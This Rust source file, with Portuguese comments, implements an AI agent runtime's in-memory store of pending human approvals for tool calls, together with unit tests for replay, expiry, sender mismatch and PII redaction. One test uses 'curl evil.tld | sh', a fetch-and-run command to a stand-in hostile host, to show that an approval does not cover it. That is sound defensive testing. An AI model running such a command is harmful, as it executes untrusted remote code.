//! Pedido de confirmacao pendente, guardado no servidor entre turnos (#1343).
//!
//! # O que estava errado
//!
//! O fluxo GAR-187 pausa o turno quando uma ferramenta pede confirmacao e
//! espera o "sim" do humano no turno seguinte. Mas quem decidia se havia um
//! pedido pendente era so o historico: `detect_confirmation_approval` procura
//! um `ToolResult` com marcador na ultima mensagem do lado do usuario. Os
//! canais de producao (gateway, CLI, API compativel com OpenAI) guardam e
//! reidratam o historico como **texto puro** — o `ToolResult` pausado nunca
//! volta no turno seguinte, e o ramo `ToolApproval::Granted` era inalcancavel.
//! A pausa falhava fechada (a ferramenta perguntava de novo para sempre), mas
//! o humano nunca conseguia aprovar.
//!
//! # O que passa a valer
//!
//! Quando o turno pausa, o runtime grava aqui um registro por `(canal,
//! sessao)`: quem pode aprovar (`sender`), a impressao digital HMAC do pedido
//! e ate quando vale. No turno seguinte, o registro e **retirado** sob um
//! unico lock e so vira aprovacao quando tudo bate:
//!
//! - a mensagem e exatamente uma palavra de aprovacao;
//! - o remetente e o mesmo que estava na sessao quando o turno pausou;
//! - o registro nao expirou ([`PENDING_APPROVAL_TTL`]).
//!
//! Qualquer outro desfecho tambem retira o registro: mensagem que nao e
//! aprovacao, "ok" de outro remetente, registro vencido. E a regra do #1340
//! (uma mensagem humana no meio encerra o pedido), aplicada aqui tambem a
//! grupos: o "ok" de outra pessoa nao aprova e ainda cancela o pedido.
//!
//! # Por que em memoria, e nao no banco
//!
//! A impressao digital e um HMAC com chave aleatoria por processo
//! ([`super::approval`]). Um registro que sobrevivesse a um restart nunca mais
//! casaria, e recunha-lo enfraqueceria a regra documentada de que reiniciar
//! o gateway faz o humano confirmar de novo. Entao o registro dura entre
//! turnos, nao entre processos.
//!
//! # O que NAO e guardado
//!
//! O assunto cru do pedido (o comando do bash, que pode ter segredo) nunca
//! entra aqui: so o nome da ferramenta e o HMAC. Log so leva ferramenta e
//! canal.

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use super::approval::{ApprovalFingerprint, ToolApproval};

/// Por quanto tempo um pedido pausado espera o "sim" do humano.
pub const PENDING_APPROVAL_TTL: Duration = Duration::from_secs(300);

/// Quantos pedidos pendentes o processo guarda ao mesmo tempo. Passando
/// disso, o mais antigo sai — o humano dele e perguntado de novo, que e o
/// lado certo para errar.
pub const PENDING_APPROVAL_CAPACITY: usize = 4096;

/// As palavras que contam como aprovacao, comparadas com a mensagem inteira
/// (sem espacos nas pontas, em minusculas). "ok, mas antes..." nao e
/// aprovacao.
const APPROVAL_WORDS: [&str; 7] = [
    "sim",
    "yes",
    "confirmar",
    "confirma",
    "proceed",
    "ok",
    "approve",
];

/// A mensagem do humano e, inteira, uma palavra de aprovacao?
pub fn is_approval_word(user_text: &str) -> bool {
    let text = user_text.trim().to_lowercase();
    APPROVAL_WORDS.iter().any(|w| text == *w)
}

/// Quem pode aprovar um pedido pausado, e onde.
///
/// Um caminho so opta por este registro quando tem um remetente **derivado
/// pelo servidor** (id da plataforma do canal, `sub` do JWT, nonce da
/// conexao) — nunca um valor que o cliente escolhe. Sem escopo, o turno usa
/// a deteccao antiga pelo historico, exatamente como antes.
///
/// O `Debug` nao mostra o remetente: ele e um telefone no WhatsApp e no
/// Signal, um user id nas outras plataformas (PII, regra absoluta 6), e o
/// `ExecContext` que carrega o escopo tambem e `Debug`.
#[derive(Clone, PartialEq, Eq)]
pub struct ApprovalScope {
    channel: String,
    session_id: String,
    sender: String,
}

/// Como o remetente aparece num `Debug`: so o tamanho. Um hash curto de um
/// telefone seria revertido por forca bruta.
struct Redigido(usize);

impl std::fmt::Debug for Redigido {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "<redigido: {} bytes>", self.0)
    }
}

impl std::fmt::Debug for ApprovalScope {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ApprovalScope")
            .field("channel", &self.channel)
            // Em WhatsApp, Signal e LINE o id de sessao carrega o remetente
            // (`whatsapp-<telefone>`); passa pela mesma mascara do log.
            .field(
                "session_id",
                &garraia_security::mascarar_numeros_longos(&self.session_id),
            )
            .field("sender", &Redigido(self.sender.len()))
            .finish()
    }
}

impl ApprovalScope {
    /// Monta o escopo. Devolve `None` se qualquer campo vier vazio: um
    /// remetente vazio seria o mesmo para todo mundo sem identidade, e ai o
    /// "sim" de qualquer um aprovaria. Sem escopo o caminho continua como
    /// hoje, e a pausa e terminal.
    pub fn new(channel: &str, session_id: &str, sender: &str) -> Option<Self> {
        let channel = channel.trim();
        let session_id = session_id.trim();
        let sender = sender.trim();
        if channel.is_empty() || session_id.is_empty() || sender.is_empty() {
            return None;
        }
        Some(Self {
            channel: channel.to_string(),
            session_id: session_id.to_string(),
            sender: sender.to_string(),
        })
    }

    pub fn channel(&self) -> &str {
        &self.channel
    }

    pub fn session_id(&self) -> &str {
        &self.session_id
    }

    pub fn sender(&self) -> &str {
        &self.sender
    }

    fn key(&self) -> (String, String) {
        (self.channel.clone(), self.session_id.clone())
    }
}

/// Um pedido pausado esperando aprovacao. `Debug` manual pelo mesmo motivo
/// do [`ApprovalScope`]: o remetente nao aparece.
#[derive(Clone)]
struct PendingApproval {
    sender: String,
    tool: String,
    fingerprint: ApprovalFingerprint,
    created_at: Instant,
    expires_at: Instant,
}

impl std::fmt::Debug for PendingApproval {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PendingApproval")
            .field("sender", &Redigido(self.sender.len()))
            .field("tool", &self.tool)
            .field("fingerprint", &self.fingerprint)
            .field("created_at", &self.created_at)
            .field("expires_at", &self.expires_at)
            .finish()
    }
}

/// Os pedidos pausados do processo, no maximo um por `(canal, sessao)`.
///
/// `Debug` manual: a chave do mapa e `(canal, sessao)`, e a sessao pode
/// carregar o telefone do remetente. O dump mostra so quantos pedidos ha.
pub struct PendingApprovals {
    inner: Mutex<HashMap<(String, String), PendingApproval>>,
    ttl: Duration,
    capacity: usize,
}

impl std::fmt::Debug for PendingApprovals {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let pendentes = self
            .inner
            .lock()
            .map(|m| m.len())
            .unwrap_or_else(|e| e.into_inner().len());
        f.debug_struct("PendingApprovals")
            .field("pendentes", &pendentes)
            .field("ttl", &self.ttl)
            .field("capacity", &self.capacity)
            .finish()
    }
}

impl Default for PendingApprovals {
    fn default() -> Self {
        Self::new()
    }
}

impl PendingApprovals {
    pub fn new() -> Self {
        Self::with_limits(PENDING_APPROVAL_TTL, PENDING_APPROVAL_CAPACITY)
    }

    /// Para os testes: TTL e capacidade menores. Capacidade zero vira um.
    pub fn with_limits(ttl: Duration, capacity: usize) -> Self {
        Self {
            inner: Mutex::new(HashMap::new()),
            ttl,
            capacity: capacity.max(1),
        }
    }

    /// O lock sem panico. Se uma thread morreu segurando o lock, o mapa pode
    /// estar pela metade: descarta todos os pedidos (cada humano e
    /// perguntado de novo) em vez de confiar no que sobrou.
    fn lock(&self) -> std::sync::MutexGuard<'_, HashMap<(String, String), PendingApproval>> {
        match self.inner.lock() {
            Ok(guard) => guard,
            Err(poisoned) => {
                let mut guard = poisoned.into_inner();
                guard.clear();
                self.inner.clear_poison();
                guard
            }
        }
    }

    /// Grava o pedido que acabou de pausar o turno. Um pedido novo na mesma
    /// `(canal, sessao)` substitui o anterior: o "sim" responde ao ultimo,
    /// que e o que o humano acabou de ler (#1339).
    pub fn register(
        &self,
        scope: &ApprovalScope,
        tool: &str,
        fingerprint: ApprovalFingerprint,
        now: Instant,
    ) {
        let mut map = self.lock();
        map.retain(|_, p| now < p.expires_at);
        let key = scope.key();
        if !map.contains_key(&key) && map.len() >= self.capacity {
            let oldest = map
                .iter()
                .min_by_key(|(_, p)| p.created_at)
                .map(|(k, _)| k.clone());
            if let Some(k) = oldest {
                map.remove(&k);
            }
        }
        tracing::info!(
            channel = %scope.channel,
            tool = %tool,
            "aprovacao pendente registrada"
        );
        map.insert(
            key,
            PendingApproval {
                sender: scope.sender.clone(),
                tool: tool.to_string(),
                fingerprint,
                created_at: now,
                expires_at: now + self.ttl,
            },
        );
    }

    /// Resolve a mensagem de agora contra o pedido pendente desta
    /// `(canal, sessao)`. O registro sai do mapa em TODO desfecho — por isso
    /// um "sim" repetido nao aprova duas vezes, e uma mensagem humana
    /// qualquer encerra o pedido.
    pub fn resolve(&self, scope: &ApprovalScope, user_text: &str, now: Instant) -> ToolApproval {
        let Some(pending) = self.lock().remove(&scope.key()) else {
            return ToolApproval::None;
        };
        if !is_approval_word(user_text) {
            tracing::info!(
                channel = %scope.channel,
                tool = %pending.tool,
                "aprovacao pendente encerrada: mensagem nao e aprovacao"
            );
            return ToolApproval::None;
        }
        if pending.sender != scope.sender {
            tracing::warn!(
                channel = %scope.channel,
                tool = %pending.tool,
                "aprovacao pendente recusada: remetente diferente do que pausou"
            );
            return ToolApproval::None;
        }
        if now >= pending.expires_at {
            tracing::info!(
                channel = %scope.channel,
                tool = %pending.tool,
                "aprovacao pendente recusada: expirou"
            );
            return ToolApproval::None;
        }
        ToolApproval::Granted(pending.fingerprint.as_str().to_string())
    }

    /// Quantos pedidos estao guardados agora (vencidos inclusive, ate a
    /// proxima escrita varre-los).
    pub fn len(&self) -> usize {
        self.lock().len()
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn escopo(canal: &str, sessao: &str, remetente: &str) -> ApprovalScope {
        ApprovalScope::new(canal, sessao, remetente).expect("escopo valido")
    }

    fn fp(assunto: &str) -> ApprovalFingerprint {
        ApprovalFingerprint::of("bash", assunto)
    }

    #[test]
    fn palavra_de_aprovacao_e_a_mensagem_inteira() {
        for w in [
            "sim",
            " OK ",
            "Yes",
            "confirmar",
            "confirma",
            "proceed",
            "approve",
        ] {
            assert!(is_approval_word(w), "{w}");
        }
        for w in ["nao", "ok, mas antes", "sim sim", "", "okay"] {
            assert!(!is_approval_word(w), "{w}");
        }
    }

    #[test]
    fn escopo_com_campo_vazio_nao_existe() {
        assert!(ApprovalScope::new("", "s", "u").is_none());
        assert!(ApprovalScope::new("web", " ", "u").is_none());
        assert!(ApprovalScope::new("web", "s", "").is_none());
        assert!(ApprovalScope::new("web", "s", "u").is_some());
    }

    #[test]
    fn mesmo_escopo_aprova_uma_vez_so() {
        let store = PendingApprovals::new();
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);

        let ap = store.resolve(&a, "sim", t0 + Duration::from_secs(1));
        assert!(ap.covers("bash", "rm x"));
        assert!(!ap.covers("bash", "rm y"));

        // Replay: o segundo "sim" nao encontra nada.
        assert_eq!(
            store.resolve(&a, "sim", t0 + Duration::from_secs(2)),
            ToolApproval::None
        );
        assert!(store.is_empty());
    }

    #[test]
    fn outra_sessao_ou_outro_canal_nao_aprova() {
        let store = PendingApprovals::new();
        let t0 = Instant::now();
        store.register(&escopo("web", "s1", "conn-a"), "bash", fp("rm x"), t0);

        assert_eq!(
            store.resolve(&escopo("web", "s2", "conn-a"), "sim", t0),
            ToolApproval::None
        );
        // Mesma sessao em OUTRO canal (ex.: X-Session-Id da API OpenAI
        // apontando para uma sessao do web).
        assert_eq!(
            store.resolve(&escopo("openai", "s1", "conn-a"), "sim", t0),
            ToolApproval::None
        );
        // O registro original segue intacto para o dono.
        assert!(
            store
                .resolve(&escopo("web", "s1", "conn-a"), "sim", t0)
                .covers("bash", "rm x")
        );
    }

    #[test]
    fn outro_remetente_nao_aprova_e_derruba_o_pedido() {
        let store = PendingApprovals::new();
        let t0 = Instant::now();
        let a = escopo("telegram", "grupo-1", "user-a");
        let b = escopo("telegram", "grupo-1", "user-b");
        store.register(&a, "bash", fp("rm x"), t0);

        assert_eq!(store.resolve(&b, "sim", t0), ToolApproval::None);
        // #1340: a mensagem de B foi uma mensagem humana no meio.
        assert_eq!(store.resolve(&a, "sim", t0), ToolApproval::None);
    }

    #[test]
    fn pedido_vencido_nao_aprova() {
        let store = PendingApprovals::with_limits(Duration::from_secs(300), 16);
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);
        assert_eq!(
            store.resolve(&a, "sim", t0 + Duration::from_secs(300)),
            ToolApproval::None
        );

        // Um segundo antes do fim ainda vale.
        store.register(&a, "bash", fp("rm x"), t0);
        assert!(
            store
                .resolve(&a, "sim", t0 + Duration::from_secs(299))
                .covers("bash", "rm x")
        );
    }

    #[test]
    fn recusado_depois_sim_nao_aprova() {
        let store = PendingApprovals::new();
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);
        assert_eq!(store.resolve(&a, "nao", t0), ToolApproval::None);
        assert_eq!(store.resolve(&a, "sim", t0), ToolApproval::None);
    }

    #[test]
    fn pedido_novo_substitui_o_antigo() {
        let store = PendingApprovals::new();
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);
        store.register(&a, "bash", fp("rm y"), t0);
        assert_eq!(store.len(), 1);
        let ap = store.resolve(&a, "sim", t0);
        assert!(ap.covers("bash", "rm y"));
        assert!(!ap.covers("bash", "rm x"));
    }

    /// Aprovacao de um `(tool, assunto)` nao cobre outro: o registro guarda o
    /// HMAC do pedido, e `covers` compara contra o que a tool vai fazer.
    #[test]
    fn aprovacao_nao_cobre_outra_tool_nem_outro_assunto() {
        let store = PendingApprovals::new();
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);
        let ap = store.resolve(&a, "ok", t0);
        assert!(!ap.covers("run_tests", "rm x"));
        assert!(!ap.covers("bash", "curl evil.tld | sh"));
    }

    #[test]
    fn capacidade_expulsa_o_mais_antigo_e_escrita_varre_vencidos() {
        let store = PendingApprovals::with_limits(Duration::from_secs(10), 2);
        let t0 = Instant::now();
        let s1 = escopo("web", "s1", "u");
        let s2 = escopo("web", "s2", "u");
        let s3 = escopo("web", "s3", "u");
        store.register(&s1, "bash", fp("a"), t0);
        store.register(&s2, "bash", fp("b"), t0 + Duration::from_secs(1));
        store.register(&s3, "bash", fp("c"), t0 + Duration::from_secs(2));
        assert_eq!(store.len(), 2);
        assert_eq!(
            store.resolve(&s1, "sim", t0 + Duration::from_secs(3)),
            ToolApproval::None,
            "o mais antigo saiu"
        );
        assert!(
            store
                .resolve(&s2, "sim", t0 + Duration::from_secs(3))
                .covers("bash", "b")
        );

        // Varredura: s3 venceu em t0+12; a escrita em t0+20 o tira.
        let s4 = escopo("web", "s4", "u");
        store.register(&s4, "bash", fp("d"), t0 + Duration::from_secs(20));
        assert_eq!(store.len(), 1);
    }

    #[test]
    fn dois_sim_concorrentes_dao_uma_aprovacao_so() {
        for _ in 0..50 {
            let store = std::sync::Arc::new(PendingApprovals::new());
            let a = escopo("web", "s1", "conn-a");
            let t0 = Instant::now();
            store.register(&a, "bash", fp("rm x"), t0);
            let barreira = std::sync::Arc::new(std::sync::Barrier::new(2));
            let concedidas: usize = std::thread::scope(|s| {
                let hs: Vec<_> = (0..2)
                    .map(|_| {
                        let store = std::sync::Arc::clone(&store);
                        let barreira = std::sync::Arc::clone(&barreira);
                        let a = a.clone();
                        s.spawn(move || {
                            barreira.wait();
                            store.resolve(&a, "sim", t0) != ToolApproval::None
                        })
                    })
                    .collect();
                hs.into_iter()
                    .map(|h| usize::from(h.join().expect("thread")))
                    .sum()
            });
            assert_eq!(concedidas, 1);
        }
    }

    /// Lock envenenado: os pedidos sao descartados e nada panica.
    #[test]
    fn lock_envenenado_descarta_pedidos_sem_panico() {
        let store = std::sync::Arc::new(PendingApprovals::new());
        let a = escopo("web", "s1", "conn-a");
        let t0 = Instant::now();
        store.register(&a, "bash", fp("rm x"), t0);
        let s = std::sync::Arc::clone(&store);
        let _ = std::thread::spawn(move || {
            let _g = s.inner.lock().expect("lock");
            panic!("envenena");
        })
        .join();
        assert_eq!(store.resolve(&a, "sim", t0), ToolApproval::None);
        store.register(&a, "bash", fp("rm x"), t0);
        assert!(store.resolve(&a, "sim", t0).covers("bash", "rm x"));
    }

    /// N1 (#1343): o `Debug` do escopo, do `ExecContext` que o carrega e do
    /// registro nao mostra o remetente (telefone, user id).
    #[test]
    fn debug_nao_mostra_o_remetente() {
        // A forma real da sessao do WhatsApp Cloud: o telefone mora nela.
        let a = escopo("whatsapp", "whatsapp-+5511987654321", "+5511987654321");
        let dump = format!("{a:?}");
        assert!(!dump.contains("5511987654321"), "{dump}");
        assert!(
            dump.contains("whatsapp"),
            "o canal continua legivel: {dump}"
        );
        assert!(dump.contains("<redigido: 14 bytes>"), "{dump}");

        let exec = crate::exec_context::ExecContext {
            approval_scope: Some(a.clone()),
            ..Default::default()
        };
        let dump = format!("{exec:?}");
        assert!(!dump.contains("5511987654321"), "{dump}");

        let store = PendingApprovals::new();
        store.register(&a, "bash", fp("rm x"), Instant::now());
        let dump = format!("{store:?}");
        assert!(!dump.contains("5511987654321"), "{dump}");
        assert!(dump.contains("pendentes: 1"), "{dump}");

        let linked = escopo(
            "whatsapp_linked",
            "whatsapp-linked-5511987654321@s.whatsapp.net",
            "5511987654321@s.whatsapp.net",
        );
        let dump = format!("{linked:?}");
        assert!(!dump.contains("5511987654321"), "{dump}");
        assert!(dump.contains("4321@s.whatsapp.net"), "{dump}");
    }

    /// O registro nunca guarda o assunto cru — so o HMAC.
    #[test]
    fn registro_nao_guarda_o_assunto_cru() {
        let store = PendingApprovals::new();
        let a = escopo("web", "s1", "conn-a");
        store.register(&a, "bash", fp("export TOKEN=segredo-123"), Instant::now());
        let dump = format!("{store:?}");
        assert!(!dump.contains("segredo-123"), "{dump}");
    }
}
